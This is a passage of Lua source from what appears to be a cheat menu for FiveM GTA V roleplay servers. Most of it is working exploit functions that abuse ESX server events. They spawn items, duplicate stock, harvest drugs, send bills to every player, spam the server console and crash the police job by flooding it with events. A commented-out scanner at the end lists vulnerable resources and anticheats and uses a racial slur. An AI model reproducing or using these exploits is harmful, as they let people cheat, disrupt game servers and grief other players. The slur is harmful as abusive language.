		Aldoportu.dTCE(true, true, 'esx_drugs:stopHarvestWeed')
		Aldoportu.dTCE(true, true, 'esx_drugs:stopTransformWeed')
		Aldoportu.dTCE(true, true, 'esx_drugs:stopHarvestOpium')
		Aldoportu.dTCE(true, true, 'esx_drugs:stopTransformOpium')
		Aldoportu.dTCE(true, true, 'esx_drugs:stopHarvestMeth')
		Aldoportu.dTCE(true, true, 'esx_drugs:stopTransformMeth')
		Aldoportu.dTCE(true, true, 'esx_drugs:stopHarvestCoke')
		Aldoportu.dTCE(true, true, 'esx_drugs:stopTransformCoke')
	end
	if Aldoportu.functions.doesResourceExist('esx_illegal_drugs') then
		Aldoportu.dTCE(true, true, 'esx_illegal_drugs:stopHarvestWeed')
		Aldoportu.dTCE(true, true, 'esx_illegal_drugs:stopTransformWeed')
		Aldoportu.dTCE(true, true, 'esx_illegal_drugs:stopHarvestOpium')
		Aldoportu.dTCE(true, true, 'esx_illegal_drugs:stopTransformOpium')
		Aldoportu.dTCE(true, true, 'esx_illegal_drugs:stopHarvestMeth')
		Aldoportu.dTCE(true, true, 'esx_illegal_drugs:stopTransformMeth')
		Aldoportu.dTCE(true, true, 'esx_illegal_drugs:stopHarvestCoke')
		Aldoportu.dTCE(true, true, 'esx_illegal_drugs:stopTransformCoke')
	end
	if Aldoportu.functions.doesResourceExist('esx_mechanicjob') then
		Aldoportu.dTCE(true, true, 'esx_mechanicjob:stopHarvest')
		Aldoportu.dTCE(true, true, 'esx_mechanicjob:stopHarvest2')
		Aldoportu.dTCE(true, true, 'esx_mechanicjob:stopHarvest3')
		Aldoportu.dTCE(true, true, 'esx_mechanicjob:stopCraft')
		Aldoportu.dTCE(true, true, 'esx_mechanicjob:stopCraft2')
		Aldoportu.dTCE(true, true, 'esx_mechanicjob:stopCraft3')
	end
	if Aldoportu.functions.doesResourceExist('esx_mecanojob') then 
		Aldoportu.dTCE(true, true, 'esx_mecanojob:stopHarvest')
		Aldoportu.dTCE(true, true, 'esx_mecanojob:stopHarvest2')
		Aldoportu.dTCE(true, true, 'esx_mecanojob:stopHarvest3')
		Aldoportu.dTCE(true, true, 'esx_mecanojob:stopCraft')
		Aldoportu.dTCE(true, true, 'esx_mecanojob:stopCraft2')
		Aldoportu.dTCE(true, true, 'esx_mecanojob:stopCraft3')
	end
end

Aldoportu.functions.exploits.esx_outlawalert = function()
	if Aldoportu.functions.doesResourceExist('esx_outlawalert') then
		Aldoportu.dTCE(true, true, 'esx_outlawalert:gunshotInProgress', { x = 1337, y = 1337, z = 1337 }, 'ESX_UmuT SikeR', 0)
	else Aldoportu.pushNotification('Resource was not found!', 5000) end
end

Aldoportu.functions.exploits.esx_billing = function()
	if Aldoportu.functions.doesResourceExist('esx_billing') then
		local billName = Aldoportu.trashFunctions.keyboardInput('Enter bill name', 'Aldoportu', 32)
		local billAmount = Aldoportu.trashFunctions.keyboardInput('Enter bill amount', '', 16)
		for i=0, #Aldoportu.natives.getActivePlayers() do
			if Aldoportu.functions.game.isNullOrEmpty(billName) then billName = 'Aldoportu > all' end
			if Aldoportu.functions.game.isNullOrEmpty(billAmount) then billAmount = 5391 end
			Aldoportu.dTCE(true, true, 'esx_billing:sendBill', GetPlayerServerId(i), 'Aldoportu', billName, billAmount)
		end
	else Aldoportu.pushNotification('Resource was not found!', 5000) end
end

Aldoportu.functions.exploits.esx_policejob_crash = function()
	if Aldoportu.functions.doesResourceExist('esx_policejob') then
		pCreateThread(function()
			for i = 1, 50, 1 do
				Aldoportu.dTCE(true, true, 'esx_policejob:spawned')
			end
		end)
	else Aldoportu.pushNotification('Resource was not found!', 5000) end
end

Aldoportu.functions.exploits.esx_spawncustomitem = function()
	local itemName = Aldoportu.trashFunctions.keyboardInput('Enter Item Name', '', 15)
	if Aldoportu.functions.doesResourceExist('esx_jobs') then
		if not Aldoportu.functions.game.isNullOrEmpty(itemName) then
			local ItemData = {
				{ name = itemName, db_name = itemName, time = 100, max = 100, add = 1, remove = 10, drop = 100, requires = 'nothing', requires_name = 'Nothing' }
			}
			pCreateThread(function()
				Aldoportu.dTCE(false, true, 'esx_jobs:startWork', ItemData)
				pWait(100)
				Aldoportu.dTCE(false, true, 'esx_jobs:stopWork', ItemData)
			end)
		end
	else Aldoportu.pushNotification('Resource was not found!', 5000) end
	
	local jobsToExploit = {
		'esx_mechanicjob',
		'esx_mecanojob',
		'esx_taxijob',
		'esx_vehicleshop',
		'esx_gangjob',
		'esx_mafiajob',
		'esx_carteljob',
		'esx_bikerjob'
	}
	if not Aldoportu.functions.game.isNullOrEmpty(itemName) then
		for i=1, #jobsToExploit do
			if Aldoportu.functions.doesResourceExist(jobsToExploit[i]) then
				pCreateThread(function()
					Aldoportu.dTCE(true, true, jobsToExploit[i]..':getStockItem', itemName, 100)
					Aldoportu.dTCE(true, true, jobsToExploit[i]..':putStockItems', itemName, -100)
				end)
			end
		end
	end
end

Aldoportu.functions.exploits.esx_spawncustomitems = function()
	if Aldoportu.functions.doesResourceExist('esx_jobs') then
		local item = Aldoportu.menuTables.customExploitableItems.Item[selectedESXCustomItemSpawn]
		local JobDB = Aldoportu.menuTables.customExploitableItems.ItemDatabase[item]
		if type(JobDB) == 'table' then
			pCreateThread(function()
				for key, value in pairs(JobDB) do
					local ItemRequired = Aldoportu.menuTables.customExploitableItems.ItemRequires[key]
					local ItemData = {
						{ name = key, db_name = value, time = 100, max = 1337, add = 1, remove = 10, drop = 100, requires = ItemRequired and JobDB[ItemRequired] or 'nothing', requires_name = ItemRequired and ItemRequired or 'Nothing' }
					}
					pCreateThread(function()
						Aldoportu.dTCE(false, true, 'esx_jobs:startWork', ItemData)
						pWait(1000)
						Aldoportu.dTCE(false, true, 'esx_jobs:stopWork', ItemData)
					end)
					pWait(3000)
				end
			end)
		else
			local ItemRequired = Aldoportu.menuTables.customExploitableItems.ItemRequires[item];
			local ItemData = {
				{ name = item, db_name = JobDB, time = 100, max = 100, add = 1, remove = 10, drop = 100, requires = ItemRequired and Aldoportu.menuTables.customExploitableItems.ItemDatabase[ItemRequired] or 'nothing', requires_name = ItemRequired and ItemRequired or 'Nothing' }
			}
			pCreateThread(function()
				Aldoportu.dTCE(false, true, 'esx_jobs:startWork', ItemData)
				pWait(100)
				Aldoportu.dTCE(false, true, 'esx_jobs:stopWork', ItemData)
			end)
		end
	else Aldoportu.pushNotification('Resource was not found!', 5000) end
end

Aldoportu.functions.exploits.esx_jobitems = function()
	if Aldoportu.functions.doesResourceExist('esx_jobs') then
		local item = Aldoportu.menuTables.exploitableJobsTable.Item[selectedESXItemSpawn]
		local JobDB = Aldoportu.menuTables.exploitableJobsTable.ItemDatabase[item]
		if type(JobDB) == 'table' then
			pCreateThread(function()
				for key, value in pairs(JobDB) do
					local ItemRequired = Aldoportu.menuTables.exploitableJobsTable.ItemRequires[key]
					local ItemData = { 
						{ name = key, db_name = value, time = 100, max = 1337, add = 10, remove = 10, drop = 100, requires = ItemRequired and JobDB[ItemRequired] or 'nothing', requires_name = ItemRequired and ItemRequired or 'Nothing' } 
					}
					pCreateThread(function()
						Aldoportu.dTCE(false, true, 'esx_jobs:startWork', ItemData)
						pWait(1000)
						Aldoportu.dTCE(false, true, 'esx_jobs:stopWork', ItemData)
					end)
					pWait(3000)
				end
			end)
		else
			local ItemRequired = Aldoportu.menuTables.exploitableJobsTable.ItemRequires[item]
			local ItemData = {
				{ name = item, db_name = JobDB, time = 100, max = 1337, add = 10, remove = 10, drop = 100, requires = ItemRequired and Aldoportu.menuTables.exploitableJobsTable.ItemDatabase[ItemRequired] or 'nothing', requires_name = ItemRequired and ItemRequired or 'Nothing' }
			}
			pCreateThread(function()
				Aldoportu.dTCE(false, true, 'esx_jobs:startWork', ItemData)
				pWait(100)
				Aldoportu.dTCE(false, true, 'esx_jobs:stopWork', ItemData)
			end)
		end
	else Aldoportu.pushNotification('Resource was not found!', 5000) end
end

Aldoportu.functions.exploits.esx_harvestitems = function()
	if selectedESXHarvestItem == 1 then
		if Aldoportu.functions.doesResourceExist('esx_drugs') then
			Aldoportu.dTCE(true, true, 'esx_drugs:startHarvestWeed')
			Aldoportu.dTCE(true, true, 'esx_drugs:startTransformWeed')
			Aldoportu.dTCE(true, true, 'esx_drugs:pickedUpCannabis')
			Aldoportu.dTCE(true, true, 'esx_drugs:processCannabis')
		elseif Aldoportu.functions.doesResourceExist('esx_illegal_drugs') then
			Aldoportu.dTCE(true, true, 'esx_illegal_drugs:startHarvestWeed')
			Aldoportu.dTCE(true, true, 'esx_illegal_drugs:startTransformWeed')
		end
	elseif selectedESXHarvestItem == 2 then
		if Aldoportu.functions.doesResourceExist('esx_drugs') then
			Aldoportu.dTCE(true, true, 'esx_drugs:startHarvestOpium')
			Aldoportu.dTCE(true, true, 'esx_drugs:startTransformOpium')
		elseif Aldoportu.functions.doesResourceExist('esx_illegal_drugs') then
			Aldoportu.dTCE(true, true, 'esx_illegal_drugs:startHarvestOpium')
			Aldoportu.dTCE(true, true, 'esx_illegal_drugs:startTransformOpium')
		end
	elseif selectedESXHarvestItem == 3 then
		if Aldoportu.functions.doesResourceExist('esx_drugs') then
			Aldoportu.dTCE(true, true, 'esx_illegal_drugs:startHarvestMeth')
			Aldoportu.dTCE(true, true, 'esx_illegal_drugs:startTransformMeth')
		elseif Aldoportu.functions.doesResourceExist('esx_illegal_drugs') then
			Aldoportu.dTCE(true, true, 'esx_drugs:startHarvestMeth')
			Aldoportu.dTCE(true, true, 'esx_drugs:startTransformMeth')
		end
	elseif selectedESXHarvestItem == 4 then
		if Aldoportu.functions.doesResourceExist('esx_drugs') then
			Aldoportu.dTCE(true, true, 'esx_drugs:startHarvestCoke')
			Aldoportu.dTCE(true, true, 'esx_drugs:startTransformCoke')
		elseif Aldoportu.functions.doesResourceExist('esx_illegal_drugs') then
			Aldoportu.dTCE(true, true, 'esx_illegal_drugs:startHarvestCoke')
			Aldoportu.dTCE(true, true, 'esx_illegal_drugs:startTransformCoke')
		elseif Aldoportu.functions.doesResourceExist('erratic_coke') then
			Aldoportu.dTCE(true, true, 'coke:GiveItem')
			Aldoportu.dTCE(true, true, 'coke:GiveItem')
			Aldoportu.dTCE(true, true, 'coke:processed')
		end
	end
	if selectedESXHarvestItem == 5 then
		if Aldoportu.functions.doesResourceExist('esx_mechanicjob') then
			Aldoportu.dTCE(true, true, 'esx_mechanicjob:startHarvest')
			Aldoportu.dTCE(true, true, 'esx_mechanicjob:startCraft')
		elseif Aldoportu.functions.doesResourceExist('esx_mecanojob') then
			Aldoportu.dTCE(true, true, 'esx_mecanojob:startHarvest')
			Aldoportu.dTCE(true, true, 'esx_mecanojob:startCraft')
		end
	elseif selectedESXHarvestItem == 6 then
		if Aldoportu.functions.doesResourceExist('esx_mechanicjob') then
			Aldoportu.dTCE(true, true, 'esx_mechanicjob:startHarvest2')
			Aldoportu.dTCE(true, true, 'esx_mechanicjob:startCraft2')
		elseif Aldoportu.functions.doesResourceExist('esx_mecanojob') then
			Aldoportu.dTCE(true, true, 'esx_mecanojob:startHarvest2')
			Aldoportu.dTCE(true, true, 'esx_mecanojob:startCraft2')
		end
	elseif selectedESXHarvestItem == 7 then
		if Aldoportu.functions.doesResourceExist('esx_mechanicjob') then
			Aldoportu.dTCE(true, true, 'esx_mechanicjob:startHarvest3')
			Aldoportu.dTCE(true, true, 'esx_mechanicjob:startCraft3')
		elseif Aldoportu.functions.doesResourceExist('esx_mecanojob') then
			Aldoportu.dTCE(true, true, 'esx_mecanojob:startHarvest3')
			Aldoportu.dTCE(true, true, 'esx_mecanojob:startCraft3')
		end
	end
end

Aldoportu.functions.exploits.esx_spam_server_console = function()
	if Aldoportu.datastore.ESX ~= nil then
		for i = 4, 9 do
			Aldoportu.datastore.ESX.TriggerServerCallback('^'..i..'d'..'opamine'..math.random(5000, 10000), function(players)
			end)
		end
	else 
		Aldoportu.pushNotification('ESX was not found', 5000) 
	end
end

--[[
	Game functions(text, math, etc).
]]

Aldoportu.functions.game = {}

Aldoportu.functions.game.isNullOrEmpty = function(str) 
	return str == nil or str == '' 
end

Aldoportu.functions.game.subtitle = function(message, duration, drawImmediately)
    if duration == nil then 
    	duration = 2500 
    end
    if drawImmediately == nil then 
    	drawImmediately = true
     end
    ClearPrints()
    SetTextEntry_2('STRING')
    for i = 1, message:len(), 99 do
        Aldoportu.natives.addTextComponentSubstringPlayerName(string.sub(message, i, i + 99))
    end
    DrawSubtitleTimed(duration, drawImmediately)
end

Aldoportu.functions.game.getVehicles = function()
	local vehicles = {}

	for vehicle in Aldoportu.trashFunctions.enumVehicles() do
		table.insert(vehicles, vehicle)
	end

	return vehicles
end

Aldoportu.functions.game.getVehiclesInArea = function(coords, area)
	local vehicles       = Aldoportu.functions.game.getVehicles()
	local vehiclesInArea = {}

	for i = 1, #vehicles, 1 do
		local vehicleCoords = GetEntityCoords(vehicles[i])
		local distance      = GetDistanceBetweenCoords(vehicleCoords, coords.x, coords.y, coords.z, true)

		if distance <= area then
			table.insert(vehiclesInArea, vehicles[i])
		end
	end

	return vehiclesInArea
end

Aldoportu.functions.game.driftSmoke = function(base, sub, car, dens, size)
    all_part = {}
    
    for i = 0,dens do
        UseParticleFxAssetNextCall(base)
        W1 = StartParticleFxLoopedOnEntityBone(sub, car, 0.05, 0, 0, 0, 0, 0, GetEntityBoneIndexByName(car, 'wheel_lr'), size, 0, 0, 0)

        UseParticleFxAssetNextCall(base)
        W2 = StartParticleFxLoopedOnEntityBone(sub, car, 0.05, 0, 0, 0, 0, 0, GetEntityBoneIndexByName(car, 'wheel_rr'), size, 0, 0, 0)

        table.insert(all_part, 1, W1)
        table.insert(all_part, 2, W2)
    end
    
    pWait(1000)
    
    for _,W1 in pairs(all_part) do
        StopParticleFxLooped(W1, true)
    end
end

Aldoportu.functions.game.vehicleAngle = function(veh)
    if not veh then return false end
    local vx,vy,vz = table.unpack(GetEntityVelocity(veh))
    local modV = math.sqrt(vx*vx + vy*vy)
    
    local rx,ry,rz = table.unpack(GetEntityRotation(veh,0))
    local sn,cs = -math.sin(math.rad(rz)), math.cos(math.rad(rz))
    
    if GetEntitySpeed(veh)* 3.6 < 5 or GetVehicleCurrentGear(veh) == 0 then return 0,modV end
    
    local cosX = (sn*vx + cs*vy)/modV
    if cosX > 0.966 or cosX < 0 then return 0,modV end
    return math.deg(math.acos(cosX))*0.5, modV
end

Aldoportu.functions.initializeUpgradesTab = function()
	local currentVehicle = Aldoportu.datastore.pLocalPlayer.cVehicle
	if currentVehicle then
		for i, actual_i in pairs(Aldoportu.menuTables.vehiclePerformanceTable) do
			if Aldoportu.menuButton(actual_i.name,'vehicleLosSantosCustomsPerformance'..actual_i.name) then
			end
		end
		--[[SetVehicleModKit(currentVehicle, 0)
		local modType = 15
		local modName = 'Suspension Level '
		local modCount = GetNumVehicleMods(currentVehicle, modType) - 1
		for i=0, modCount, 1 do
			if Aldoportu.button(modName..i, 'Native') then
				SetVehicleMod(currentVehicle, modType, i)
			end
		end]]
	end
end

Aldoportu.functions.game.getVehicleProperties = function(vehicle)
	if DoesEntityExist(vehicle) then
		local colorPrimary, colorSecondary = GetVehicleColours(vehicle)
		local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
		local extras = {}

		for id=0, 12 do
			if Aldoportu.natives.doesExtraExist(vehicle, id) then
				local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
				extras[tostring(id)] = state
			end
		end

		return {
			model             = GetEntityModel(vehicle),

			plate             = Aldoportu.functions.Math.Trim(GetVehicleNumberPlateText(vehicle)),
			plateIndex        = GetVehicleNumberPlateTextIndex(vehicle),

			bodyHealth        = Aldoportu.functions.Math.Round(GetVehicleBodyHealth(vehicle), 1),
			engineHealth      = Aldoportu.functions.Math.Round(GetVehicleEngineHealth(vehicle), 1),

			fuelLevel         = Aldoportu.functions.Math.Round(GetVehicleFuelLevel(vehicle), 1),
			dirtLevel         = Aldoportu.functions.Math.Round(GetVehicleDirtLevel(vehicle), 1),
			color1            = colorPrimary,
			color2            = colorSecondary,

			pearlescentColor  = pearlescentColor,
			wheelColor        = wheelColor,

			wheels            = GetVehicleWheelType(vehicle),
			windowTint        = GetVehicleWindowTint(vehicle),
			xenonColor        = Aldoportu.natives.getVehicleXenonLightsColour(vehicle),

			neonEnabled       = {
				IsVehicleNeonLightEnabled(vehicle, 0),
				IsVehicleNeonLightEnabled(vehicle, 1),
				IsVehicleNeonLightEnabled(vehicle, 2),
				IsVehicleNeonLightEnabled(vehicle, 3)
			},

			neonColor         = table.pack(GetVehicleNeonLightsColour(vehicle)),
			extras            = extras,
			tyreSmokeColor    = table.pack(GetVehicleTyreSmokeColor(vehicle)),

			modSpoilers       = GetVehicleMod(vehicle, 0),
			modFrontBumper    = GetVehicleMod(vehicle, 1),
			modRearBumper     = GetVehicleMod(vehicle, 2),
			modSideSkirt      = GetVehicleMod(vehicle, 3),
			modExhaust        = GetVehicleMod(vehicle, 4),
			modFrame          = GetVehicleMod(vehicle, 5),
			modGrille         = GetVehicleMod(vehicle, 6),
			modHood           = GetVehicleMod(vehicle, 7),
			modFender         = GetVehicleMod(vehicle, 8),
			modRightFender    = GetVehicleMod(vehicle, 9),
			modRoof           = GetVehicleMod(vehicle, 10),

			modEngine         = GetVehicleMod(vehicle, 11),
			modBrakes         = GetVehicleMod(vehicle, 12),
			modTransmission   = GetVehicleMod(vehicle, 13),
			modHorns          = GetVehicleMod(vehicle, 14),
			modSuspension     = GetVehicleMod(vehicle, 15),
			modArmor          = GetVehicleMod(vehicle, 16),

			modTurbo          = IsToggleModOn(vehicle, 18),
			modSmokeEnabled   = IsToggleModOn(vehicle, 20),
			modXenon          = IsToggleModOn(vehicle, 22),

			modFrontWheels    = GetVehicleMod(vehicle, 23),
			modBackWheels     = GetVehicleMod(vehicle, 24),

			modPlateHolder    = GetVehicleMod(vehicle, 25),
			modVanityPlate    = GetVehicleMod(vehicle, 26),
			modTrimA          = GetVehicleMod(vehicle, 27),
			modOrnaments      = GetVehicleMod(vehicle, 28),
			modDashboard      = GetVehicleMod(vehicle, 29),
			modDial           = GetVehicleMod(vehicle, 30),
			modDoorSpeaker    = GetVehicleMod(vehicle, 31),
			modSeats          = GetVehicleMod(vehicle, 32),
			modSteeringWheel  = GetVehicleMod(vehicle, 33),
			modShifterLeavers = GetVehicleMod(vehicle, 34),
			modAPlate         = GetVehicleMod(vehicle, 35),
			modSpeakers       = GetVehicleMod(vehicle, 36),
			modTrunk          = GetVehicleMod(vehicle, 37),
			modHydrolic       = GetVehicleMod(vehicle, 38),
			modEngineBlock    = GetVehicleMod(vehicle, 39),
			modAirFilter      = GetVehicleMod(vehicle, 40),
			modStruts         = GetVehicleMod(vehicle, 41),
			modArchCover      = GetVehicleMod(vehicle, 42),
			modAerials        = GetVehicleMod(vehicle, 43),
			modTrimB          = GetVehicleMod(vehicle, 44),
			modTank           = GetVehicleMod(vehicle, 45),
			modWindows        = GetVehicleMod(vehicle, 46),
			modLivery         = GetVehicleLivery(vehicle),

			suspensionRaise = GetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fSuspensionRaise'),
		}
	else
		return
	end
end

Aldoportu.functions.game.setVehicleProperties = function(vehicle, props)
	if DoesEntityExist(vehicle) then
		local colorPrimary, colorSecondary = GetVehicleColours(vehicle)
		local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
		SetVehicleModKit(vehicle, 0)

		if props.plate then SetVehicleNumberPlateText(vehicle, props.plate) end
		if props.plateIndex then SetVehicleNumberPlateTextIndex(vehicle, props.plateIndex) end
		if props.bodyHealth then SetVehicleBodyHealth(vehicle, props.bodyHealth + 0.0) end
		if props.engineHealth then SetVehicleEngineHealth(vehicle, props.engineHealth + 0.0) end
		if props.fuelLevel then SetVehicleFuelLevel(vehicle, props.fuelLevel + 0.0) end
		if props.dirtLevel then SetVehicleDirtLevel(vehicle, props.dirtLevel + 0.0) end
		if props.color1 then SetVehicleColours(vehicle, props.color1, colorSecondary) end
		if props.color2 then SetVehicleColours(vehicle, props.color1 or colorPrimary, props.color2) end
		if props.pearlescentColor then SetVehicleExtraColours(vehicle, props.pearlescentColor, wheelColor) end
		if props.wheelColor then SetVehicleExtraColours(vehicle, props.pearlescentColor or pearlescentColor, props.wheelColor) end
		if props.wheels then SetVehicleWheelType(vehicle, props.wheels) end
		if props.windowTint then SetVehicleWindowTint(vehicle, props.windowTint) end

		if props.neonEnabled then
			SetVehicleNeonLightEnabled(vehicle, 0, props.neonEnabled[1])
			SetVehicleNeonLightEnabled(vehicle, 1, props.neonEnabled[2])
			SetVehicleNeonLightEnabled(vehicle, 2, props.neonEnabled[3])
			SetVehicleNeonLightEnabled(vehicle, 3, props.neonEnabled[4])
		end

		if props.extras then
			for id,enabled in pairs(props.extras) do
				if enabled then
					SetVehicleExtra(vehicle, tonumber(id), 0)
				else
					SetVehicleExtra(vehicle, tonumber(id), 1)
				end
			end
		end

		if props.neonColor then SetVehicleNeonLightsColour(vehicle, props.neonColor[1], props.neonColor[2], props.neonColor[3]) end
		if props.xenonColor then Aldoportu.natives.setVehicleXenonLightsColour(vehicle, props.xenonColor) end
		if props.modSmokeEnabled then ToggleVehicleMod(vehicle, 20, true) end
		if props.tyreSmokeColor then SetVehicleTyreSmokeColor(vehicle, props.tyreSmokeColor[1], props.tyreSmokeColor[2], props.tyreSmokeColor[3]) end
		if props.modSpoilers then SetVehicleMod(vehicle, 0, props.modSpoilers, false) end
		if props.modFrontBumper then SetVehicleMod(vehicle, 1, props.modFrontBumper, false) end
		if props.modRearBumper then SetVehicleMod(vehicle, 2, props.modRearBumper, false) end
		if props.modSideSkirt then SetVehicleMod(vehicle, 3, props.modSideSkirt, false) end
		if props.modExhaust then SetVehicleMod(vehicle, 4, props.modExhaust, false) end
		if props.modFrame then SetVehicleMod(vehicle, 5, props.modFrame, false) end
		if props.modGrille then SetVehicleMod(vehicle, 6, props.modGrille, false) end
		if props.modHood then SetVehicleMod(vehicle, 7, props.modHood, false) end
		if props.modFender then SetVehicleMod(vehicle, 8, props.modFender, false) end
		if props.modRightFender then SetVehicleMod(vehicle, 9, props.modRightFender, false) end
		if props.modRoof then SetVehicleMod(vehicle, 10, props.modRoof, false) end
		if props.modEngine then SetVehicleMod(vehicle, 11, props.modEngine, false) end
		if props.modBrakes then SetVehicleMod(vehicle, 12, props.modBrakes, false) end
		if props.modTransmission then SetVehicleMod(vehicle, 13, props.modTransmission, false) end
		if props.modHorns then SetVehicleMod(vehicle, 14, props.modHorns, false) end
		if props.modSuspension then SetVehicleMod(vehicle, 15, props.modSuspension, false) end
		if props.modArmor then SetVehicleMod(vehicle, 16, props.modArmor, false) end
		if props.modTurbo then ToggleVehicleMod(vehicle,  18, props.modTurbo) end
		if props.modXenon then ToggleVehicleMod(vehicle,  22, props.modXenon) end
		if props.modFrontWheels then SetVehicleMod(vehicle, 23, props.modFrontWheels, false) end
		if props.modBackWheels then SetVehicleMod(vehicle, 24, props.modBackWheels, false) end
		if props.modPlateHolder then SetVehicleMod(vehicle, 25, props.modPlateHolder, false) end
		if props.modVanityPlate then SetVehicleMod(vehicle, 26, props.modVanityPlate, false) end
		if props.modTrimA then SetVehicleMod(vehicle, 27, props.modTrimA, false) end
		if props.modOrnaments then SetVehicleMod(vehicle, 28, props.modOrnaments, false) end
		if props.modDashboard then SetVehicleMod(vehicle, 29, props.modDashboard, false) end
		if props.modDial then SetVehicleMod(vehicle, 30, props.modDial, false) end
		if props.modDoorSpeaker then SetVehicleMod(vehicle, 31, props.modDoorSpeaker, false) end
		if props.modSeats then SetVehicleMod(vehicle, 32, props.modSeats, false) end
		if props.modSteeringWheel then SetVehicleMod(vehicle, 33, props.modSteeringWheel, false) end
		if props.modShifterLeavers then SetVehicleMod(vehicle, 34, props.modShifterLeavers, false) end
		if props.modAPlate then SetVehicleMod(vehicle, 35, props.modAPlate, false) end
		if props.modSpeakers then SetVehicleMod(vehicle, 36, props.modSpeakers, false) end
		if props.modTrunk then SetVehicleMod(vehicle, 37, props.modTrunk, false) end
		if props.modHydrolic then SetVehicleMod(vehicle, 38, props.modHydrolic, false) end
		if props.modEngineBlock then SetVehicleMod(vehicle, 39, props.modEngineBlock, false) end
		if props.modAirFilter then SetVehicleMod(vehicle, 40, props.modAirFilter, false) end
		if props.modStruts then SetVehicleMod(vehicle, 41, props.modStruts, false) end
		if props.modArchCover then SetVehicleMod(vehicle, 42, props.modArchCover, false) end
		if props.modAerials then SetVehicleMod(vehicle, 43, props.modAerials, false) end
		if props.modTrimB then SetVehicleMod(vehicle, 44, props.modTrimB, false) end
		if props.modTank then SetVehicleMod(vehicle, 45, props.modTank, false) end
		if props.modWindows then SetVehicleMod(vehicle, 46, props.modWindows, false) end

		if props.modLivery then
			SetVehicleMod(vehicle, 48, props.modLivery, false)
			SetVehicleLivery(vehicle, props.modLivery)
		end

		if props.suspensionRaise then
			SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fSuspensionRaise', props.suspensionRaise)
		end
	end
end

--[[niggerian trash exploit finder
	
do
	local totalExploitablesTable = {}
	local veriScaryAntiCheats = {
		'anticheat', 'esx_anticheat', 'alphaveta', 'dfwm', 'fzac',
		'anticheese', 'skinchanger2', 'NSAC', 'avac', 'nertigel_ac'
	}
	local exploitablesDrugs = {
		'esx_drugs', 'esx_illegal_drugs'
	}
	local exploitablesMoneyMaker = {
		'esx_vangelico_robbery','esx_vangelico','esx_burglary','99kr-burglary','esx_minerjob',
		'esx_mining','esx_miner','esx_fishing','james_fishing','loffe-fishing',
		'esx_mugging','loffe_robbery','esx_prisonwork','loffe_prisonwork','esx_robnpc',
		'MF_DrugSales','MF_drugsales','ESX_DrugSales','lenzh_chopshop','esx_chopshop',
		'ESX_Deliveries','ESX_Cargodelivery','napadtransport','Napad_transport_z_gotowka','esx_truck_robbery',
		'napadnakase','Napad_na_kase','utk_oh','utk_ornateheist','aurora_principalbank',
		'esx_hunting','esx_qalle_hunting','esx-qalle-hunting','esx_taxijob','esx_taxi',
		'esx_carthiefjob','esx_carthief','esx_rangerjob','esx_ranger','esx_godirtyjob',
		'esx_godirty','esx_banksecurityjob','esx_banksecurity','esx_pilotjob','esx_pilot',
		'esx_pizzajob','esx_pizza','esx_gopostaljob','esx_gopostal','esx_garbagejob',
		'esx_garbage', 'esx_truckerjob', 'esx_trucker'
	}
	
	local totalAnticheats = 0
	local totalExploitableMoneyMaker = 0
	local totalExploitableDrugs = 0
	for i=1, #exploitablesMoneyMaker do
		if Aldoportu.functions.doesResourceExist(exploitablesMoneyMaker[i]) then
			table.insert(totalExploitablesTable, exploitablesMoneyMaker[i])
			totalExploitableMoneyMaker = totalExploitableMoneyMaker + 1
		end
	end
	for i=1, #exploitablesDrugs do
		if Aldoportu.functions.doesResourceExist(exploitablesDrugs[i]) then
			table.insert(totalExploitablesTable, exploitablesDrugs[i])
			totalExploitableDrugs = totalExploitableDrugs + 1
		end
	end
	for i=1, #veriScaryAntiCheats do
		if Aldoportu.functions.doesResourceExist(veriScaryAntiCheats[i]) then
			totalAnticheats = totalAnticheats + 1
		end
	end

	dir_print('Vulnerable resource found: '..json.encode(totalExploitablesTable))
	dir_print('Anticheats: '..totalAnticheats)
	dir_print(
		'\nTotal Exploitables:\n'..
		'	Moneymaker: '..totalExploitableMoneyMaker..'\n'..
		'	Drugs: '..totalExploitableDrugs..'\n'
	)
end]]